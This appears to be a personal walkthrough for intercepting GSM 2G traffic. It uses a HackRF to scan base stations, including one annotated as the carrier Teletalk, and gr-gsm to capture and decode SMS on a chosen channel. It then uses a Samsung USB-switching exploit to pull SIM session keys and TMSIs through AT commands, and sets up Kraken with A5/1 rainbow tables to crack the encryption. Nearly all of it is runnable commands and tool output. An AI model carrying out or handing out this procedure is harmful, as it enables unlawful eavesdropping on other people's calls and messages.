1. First Get the Rainbow table from  https://archive.org/download/A51_rainbow_tables
2. Follow this playlist tutorial https://www.youtube.com/watch?v=UKmpw4gcMSE&list=PLRovDyowOn5F_TFotx0n8A79ToZYD2lOv&index=13

3. Get Dragon OS, Do not upgrade.

4. Get Kalibrate-Hackrf from
```
git clone https://github.com/scateu/kalibrate-hackrf
cd kalibrate-hackrf/
./bootstrap && CXXFLAGS='-W -Wall -O3' ./configure && make
sudo make install
```
5. on the kalibrate Hackrf Folder Go to and run
```
./src/kal -s 900


https://www.cellmapper.net/arfcn?net=GSM&ARFCN=21&MCC=0

```
7. You will get result like this

  ________________________________________________________________
```
GSM-900:
        chan:   13 (937.6MHz + 25.819kHz)       power: 1372087.69
        chan:   14 (937.8MHz + 497Hz)   power: 3209753.01         ////Teletalk 2G 937.387 Downlink LAPDm
        chan:   15 (938.0MHz - 15.251kHz)       power: 3562031.89
        chan:   17 (938.4MHz + 33.406kHz)       power: 3631207.61
        chan:   18 (938.6MHz + 34.154kHz)       power: 3800253.43
        chan:   19 (938.8MHz + 15.328kHz)       power: 3812325.19
        chan:   20 (939.0MHz - 26.275kHz)       power: 4266365.83      //Teletalk 2G 939.2
        chan:   21 (939.2MHz - 36.334kHz)       power: 2007494.51
        chan:   24 (939.8MHz + 23.846kHz)       power: 5056018.06
        chan:   25 (940.0MHz + 5.517kHz)        power: 4851968.94
        chan:   26 (940.2MHz + 10.914kHz)       power: 4230893.41
        chan:   27 (940.4MHz - 11.936kHz)       power: 4534314.20
        chan:   43 (943.6MHz + 27.547kHz)       power: 4269051.45
        chan:   44 (943.8MHz + 32.677kHz)       power: 4810345.02
        chan:   45 (944.0MHz - 1.136kHz)        power: 4376724.47
        chan:   46 (944.2MHz + 37.652kHz)       power: 4468794.08
        chan:   47 (944.4MHz - 9.425kHz)        power: 4707912.19
        chan:   48 (944.6MHz - 24.230kHz)       power: 4605801.69
        chan:   69 (948.8MHz - 18.314kHz)       power: 4245432.34
        chan:   81 (951.2MHz + 31.983kHz)       power: 5672801.75
        chan:   82 (951.4MHz + 12.784kHz)       power: 5684655.94
        chan:   83 (951.6MHz + 11.307kHz)       power: 5625388.05
        chan:   84 (951.8MHz - 38.226kHz)       power: 5820237.75
        chan:   85 (952.0MHz - 13.828kHz)       power: 5994576.16
        chan:   93 (953.6MHz + 11.803kHz)       power: 4164758.36
        chan:   94 (953.8MHz - 186Hz)   power: 4293292.98
        chan:   95 (954.0MHz - 37.322kHz)       power: 4346337.10
        chan:   99 (954.8MHz + 26.089kHz)       power: 5505476.68
        chan:  100 (955.0MHz + 4.738kHz)        power: 5212722.30
        chan:  101 (955.2MHz + 5.860kHz)        power: 5112706.06
        chan:  102 (955.4MHz - 26.203kHz)       power: 5490840.09
        chan:  103 (955.6MHz - 39.829kHz)       power: 4713298.91
        chan:  104 (955.8MHz - 11.680kHz)       power: 5195763.87
        chan:  110 (957.0MHz + 27.657kHz)       power: 4629499.81
        chan:  111 (957.2MHz + 3.338kHz)        power: 3406185.15
        chan:  112 (957.4MHz + 1.996kHz)        power: 3105951.65
        chan:  113 (957.6MHz - 34.137kHz)       power: 3212087.06

TMSI/P-TMSI/M-TMSI/5G-TMSI: 2247214079 (0x85f1c3ff)

LAPDm Details:

Frame 731: 81 bytes on wire (648 bits), 81 bytes captured (648 bits) on interface lo, id 0
Ethernet II, Src: 00:00:00_00:00:00 (00:00:00:00:00:00), Dst: 00:00:00_00:00:00 (00:00:00:00:00:00)
Internet Protocol Version 4, Src: 127.0.0.1, Dst: 127.0.0.1
User Datagram Protocol, Src Port: 60138, Dst Port: 4729
GSM TAP Header, ARFCN: 978 (Downlink), TS: 1, Channel: SDCCH/8 (1)
    Version: 2
    Header Length: 16 bytes
    Payload Type: GSM Um (MS<->BTS) (1)
    Time Slot: 1
    ..00 0011 1101 0010 = ARFCN: 978
    .0.. .... .... .... = Uplink: 0
    0... .... .... .... = PCS band indicator: 0
    Signal Level: -37 dBm
    Signal/Noise Ratio: 0 dB
    GSM Frame Number: 625315
    Channel Type: SDCCH/8 (8)
    Antenna Number: 76
    Sub-Slot: 1
Link Access Procedure, Channel Dm (LAPDm)
    Address Field: 0x03
        .00. .... = LPD: Normal GSM (0)
        ...0 00.. = SAPI: RR/MM/CC (0)
        .... ..1. = C/R: 1
        .... ...1 = EA: Final octet (1)
    Control field: I, N(R)=4, N(S)=2 (0x84)
        100. .... = N(R): 4
        .... 010. = N(S): 2
        .... ...0 = Frame type: Information frame (0x0)
    Length Field: 0x0d
        0000 11.. = Length: 3
        .... ..0. = M: Last segment (0)
        .... ...1 = EL: Final octet (1)
GSM A-I/F DTAP - Ciphering Mode Command
    Protocol Discriminator: Radio Resources Management messages (6)
        .... 0110 = Protocol discriminator: Radio Resources Management messages (0x6)
        0000 .... = Skip Indicator: No indication of selected PLMN (0)
    DTAP Radio Resources Management Message Type: Ciphering Mode Command (0x35)
    Cipher Mode Setting
        .... ...0 = SC: No ciphering (0)
    Cipher Mode Response
        ...0 .... = CR: IMEISV shall not be included (0)



SACCH/8 (6)


SACCH8

Timeslot 1



E-GSM-900:
        chan:    9 (936.8MHz + 15.744kHz)       power: 7112232.39
        chan:   10 (937.0MHz - 9.372kHz)        power: 5891045.93
        chan:   11 (937.2MHz - 34.168kHz)       power: 6141623.56
        chan:   17 (938.4MHz + 33.021kHz)       power: 9174833.73
        chan:   18 (938.6MHz + 15.759kHz)       power: 9243625.62
        chan:   19 (938.8MHz + 12.173kHz)       power: 9300589.70
        chan:   20 (939.0MHz - 13.172kHz)       power: 9364508.73
        chan:   24 (939.8MHz + 9.350kHz)        power: 9290839.17
        chan:   45 (944.0MHz + 36.091kHz)       power: 6714960.99
        chan:   46 (944.2MHz + 36.446kHz)       power: 7012730.94
        chan:   47 (944.4MHz - 13.149kHz)       power: 6634454.42
        chan:   48 (944.6MHz - 38.024kHz)       power: 7298061.25
        chan:   51 (945.2MHz - 20.187kHz)       power: 8382740.27
        chan:   52 (945.4MHz - 37.097kHz)       power: 8101859.50
        chan:   62 (947.4MHz - 25.813kHz)       power: 7434470.83
        chan:   65 (948.0MHz + 20.314kHz)       power: 6672796.39
        chan:   66 (948.2MHz + 6.585kHz)        power: 6799140.15
        chan:   68 (948.6MHz + 4.452kHz)        power: 7185665.73
        chan:   69 (948.8MHz - 24.535kHz)       power: 7113459.46
        chan:   70 (949.0MHz - 29.037kHz)       power: 7655585.53
        chan:   81 (951.2MHz + 28.313kHz)       power: 9828488.70
        chan:   82 (951.4MHz + 37.526kHz)       power: 10217346.08
        chan:   83 (951.6MHz - 9.380kHz)        power: 10256188.96
        chan:   84 (951.8MHz - 38.478kHz)       power: 9902709.26
        chan:   87 (952.4MHz + 35.962kHz)       power: 10081851.98
        chan:   88 (952.6MHz + 14.146kHz)       power: 10125212.05
        chan:   89 (952.8MHz - 14.709kHz)       power: 10041889.69
        chan:   90 (953.0MHz - 39.672kHz)       power: 10083588.95
        chan:   91 (953.2MHz + 5.402kHz)        power: 10194897.92
        chan:   92 (953.4MHz - 14.659kHz)       power: 9914506.72
        chan:   99 (954.8MHz + 37.186kHz)       power: 8772467.33
        chan:  100 (955.0MHz + 10.976kHz)       power: 8678846.86
        chan:  101 (955.2MHz - 18.268kHz)       power: 8792641.21
        chan:  102 (955.4MHz - 39.916kHz)       power: 8877076.05
        chan:  103 (955.6MHz - 34.206kHz)       power: 8796840.40
        chan:  111 (957.2MHz + 8.931kHz)        power: 7720429.64
        chan:  112 (957.4MHz - 13.870kHz)       power: 7493585.48
        chan:  113 (957.6MHz - 37.830kHz)       power: 6893279.42
        chan:  118 (958.6MHz - 39.955kHz)       power: 4870968.13
        chan:  120 (959.0MHz + 36.305kHz)       power: 5342634.95
        chan:  121 (959.2MHz - 17.459kHz)       power: 6082202.93
        chan:  122 (959.4MHz - 16.155kHz)       power: 5047153.51
        chan: 1019 (934.0MHz + 24.964kHz)       power: 8936415.11
        chan: 1020 (934.2MHz + 29.328kHz)       power: 9357524.78                                                                                                                            
        chan: 1021 (934.4MHz + 13.184kHz)       power: 9350206.00                                                                                                                            
        chan: 1022 (934.6MHz - 26.054kHz)       power: 9081121.24 
        
        


kal: Scanning for GSM-900 base stations.
GSM-900:
        chan:   18 (938.6MHz - 1.083kHz)        power: 9827249.70
        chan:   19 (938.8MHz - 13.767kHz)       power: 9840901.57
        chan:   20 (939.0MHz - 38.997kHz)       power: 9872681.91
        chan:   45 (944.0MHz + 30.858kHz)       power: 9724778.08
        chan:   46 (944.2MHz - 1.170kHz)        power: 9750471.04
        chan:   47 (944.4MHz + 6.196kHz)        power: 9908071.94
        chan:   48 (944.6MHz - 9.231kHz)        power: 9899701.43
        chan:   60 (947.0MHz - 1.087kHz)        power: 9586970.55
        chan:   67 (948.4MHz + 23.148kHz)       power: 9374021.42
        chan:   69 (948.8MHz + 348Hz)   power: 9525426.45
        chan:   70 (949.0MHz + 18.471kHz)       power: 9999256.60
        chan:   71 (949.2MHz - 13.812kHz)       power: 9599407.10
        chan:   73 (949.6MHz - 28.953kHz)       power: 9998518.84
        chan:   79 (950.8MHz + 29.183kHz)       power: 10160130.05
        chan:   81 (951.2MHz - 20.969kHz)       power: 10173427.26
        chan:   82 (951.4MHz + 3.083kHz)        power: 10132600.01
        chan:   83 (951.6MHz - 11.569kHz)       power: 10237936.25
        chan:   84 (951.8MHz - 38.421kHz)       power: 10173225.10
        chan:   88 (952.6MHz + 11.601kHz)       power: 10123003.03
        chan:   89 (952.8MHz - 21.129kHz)       power: 9869310.98
        chan:   91 (953.2MHz + 4.536kHz)        power: 9833021.40
        chan:   92 (953.4MHz + 32.193kHz)       power: 9981458.47
        chan:   99 (954.8MHz + 32.815kHz)       power: 8569750.08
        chan:  100 (955.0MHz + 11.105kHz)       power: 8651618.95
        chan:  101 (955.2MHz - 20.683kHz)       power: 8768157.24
        chan:  102 (955.4MHz - 38.829kHz)       power: 8801026.98
        chan:  103 (955.6MHz - 38.902kHz)       power: 8847834.85


```  
________________________________________________________________


To use GR GSM
Open sudo wireshark
and select loopback
``` 
grgsm_livemon


##Capturing SMS
KC

TMSI

ARFCN
14

Downlink Frequency
937.387
৯৩৭৩৮৭০০০
grgsm_capture -g 40 -a 14 -s 1000000 sms.cfile -T 20
grgsm_decode -a 14 -s 1000000 -c ./sms.cfile -m BCCH -t 0

grgsm_capture -g 40 -a 14 -s 1000000 2sms.cfile -T 20
grgsm_decode -a 14 -s 1000000 -c ./2sms.cfile -m BCCH -t 0

grgsm_capture -g 40 -f 937387000 -s 1000000 5sms.cfile -T 40

grgsm_decode -f 937387000 -s 1000000 -c ./5sms.cfile -m BCCH -t 0
```
We need LAPDm (not gsmtap from wireshark)



https://github.com/ud2/advisories/blob/master/android/samsung/nocve-2016-0004/usbswitcher.c

7. To install Usbswitcher you need to install
```
sudo apt get install libusb-dev ```   (libusb 0.1)
https://github.com/ud2/advisories/tree/master/android/samsung/nocve-2016-0004
https://github.com/libusb/libusb
```
gcc -o usbswitcher usbswitcher.c -lusb
sudo ./usbswitcher -s
```

Usb switcher can change certain MTP mobiles to 2nd configuration where you can use AT commands to read the SIMs (Kc & TMSI).
on Mobile phone
```
cat /proc/tty/drivers
```
will show Serial/USB drivers
On PC
```
lsusb -v|less
```
This command will show something like this.
bNumConfigurations 2 will be required to switch to usb switcher to swtich to 2nd configuration.

________________________________________________________________
```
Bus 001 Device 005: ID 04e8:6860 Samsung Electronics Co., Ltd Galaxy A5 (MTP)
Device Descriptor:
  bLength                18
  bDescriptorType         1
  bcdUSB               2.10
  bDeviceClass            0 
  bDeviceSubClass         0 
  bDeviceProtocol         0 
  bMaxPacketSize0        64
  idVendor           0x04e8 Samsung Electronics Co., Ltd
  idProduct          0x6860 Galaxy A5 (MTP)
  bcdDevice            c.00
  iManufacturer           7 SAMSUNG
  iProduct                8 SAMSUNG_Android
  iSerial                 9 RZCT80PTHLX
  bNumConfigurations      1
  Configuration Descriptor:
    bLength                 9
    bDescriptorType         2
    wTotalLength       0x009f
    bNumInterfaces          5
    bConfigurationValue     1
    iConfiguration          0 
    bmAttributes         0x80
      (Bus Powered)
    MaxPower              500mA
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        0
      bAlternateSetting       0
      bNumEndpoints           3
      bInterfaceClass         6 Imaging
      bInterfaceSubClass      1 Still Image Capture
      bInterfaceProtocol      1 Picture Transfer Protocol (PIMA 15470)
      iInterface             11 MTP
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x81  EP 1 IN
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x01  EP 1 OUT
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x82  EP 2 IN
        bmAttributes            3
          Transfer Type            Interrupt
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x001c  1x 28 bytes
        bInterval               6
    Interface Association:
      bLength                 8
      bDescriptorType        11
      bFirstInterface         1
      bInterfaceCount         2
      bFunctionClass          2 Communications
      bFunctionSubClass       2 Abstract (modem)
      bFunctionProtocol       1 AT-commands (v.25ter)
      iFunction               8 SAMSUNG_Android
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        1
      bAlternateSetting       0
      bNumEndpoints           1
      bInterfaceClass         2 Communications
      bInterfaceSubClass      2 Abstract (modem)
      bInterfaceProtocol      1 AT-commands (v.25ter)
      iInterface              6 CDC Abstract Control Model (ACM)
      CDC Header:
        bcdCDC               1.10
      CDC Call Management:
        bmCapabilities       0x00
        bDataInterface          2
      CDC ACM:
        bmCapabilities       0x02
          line coding and serial state
      CDC Union:
        bMasterInterface        1
        bSlaveInterface         2 
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x84  EP 4 IN
        bmAttributes            3
          Transfer Type            Interrupt
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x000a  1x 10 bytes
        bInterval               9
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        2
      bAlternateSetting       0
      bNumEndpoints           2
      bInterfaceClass        10 CDC Data
      bInterfaceSubClass      0 
      bInterfaceProtocol      0 
      iInterface              7 SAMSUNG
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x83  EP 3 IN
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x02  EP 2 OUT
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        3
      bAlternateSetting       0
      bNumEndpoints           2
      bInterfaceClass       255 Vendor Specific Class
      bInterfaceSubClass     64 
      bInterfaceProtocol      2 
      iInterface              0 
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x85  EP 5 IN
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x03  EP 3 OUT
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        4
      bAlternateSetting       0
      bNumEndpoints           2
      bInterfaceClass       255 Vendor Specific Class
      bInterfaceSubClass     66 
      bInterfaceProtocol      1 
      iInterface             12 ADB Interface
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x04  EP 4 OUT
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x86  EP 6 IN
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
        INTERFACE CLASS:  08 24 80 0c 00 01 00 01
Binary Object Store Descriptor:
  bLength                 5
  bDescriptorType        15
  wTotalLength       0x0016
  bNumDeviceCaps          2
  USB 2.0 Extension Device Capability:
    bLength                 7
    bDescriptorType        16
    bDevCapabilityType      2
    bmAttributes   0x00000006
      BESL Link Power Management (LPM) Supported
  SuperSpeed USB Device Capability:
    bLength                10
    bDescriptorType        16
    bDevCapabilityType      3
    bmAttributes         0x00
    wSpeedsSupported   0x000f
      Device can operate at Low Speed (1Mbps)
      Device can operate at Full Speed (12Mbps)
      Device can operate at High Speed (480Mbps)
      Device can operate at SuperSpeed (5Gbps)
    bFunctionalitySupport   1
      Lowest fully-functional device speed is Full Speed (12Mbps)
    bU1DevExitLat           1 micro seconds
    bU2DevExitLat         500 micro seconds
Device Status:     0x0000
  (Bus Powered)

```
  
  ________________________________________________________________
  
  
  
8. To install Kraken
```

git clone https://github.com/joswr1ght/kraken

cd kraken/
```

Change all CPP files to compile this
```

It should be sufficient to replace the <stropts.h> inclusion with <sys/ioctl.h>```
cd to /kraken/
```
sudo make noati

cd a5_cpu/

./a5cpu_test 

cd ..

cd indexes/
```
change sample index to index.conf
  ________________________________________________________________
  ```
#Devices:  dev/node max_tables
Device: /dev/sdc2 40

#Tables: dev id(advance) offset
  ```
  ________________________________________________________________
 /dev/sdc2 is 2TB and formatted to ext4.
 it will be raw file system after indexed.

```
cp tables.conf.sample tables.conf

sudo python2 ./Behemoth.py /media/nm/backup01/A51/table
```

"/" is sensitive.

it will take 2/3 hour to copy all 1.6TB to that drive
```
cat tables.conf
```

To Run Kraken
```
cd kraken/Kraken/
sudo ./kraken  ../indexes/
```
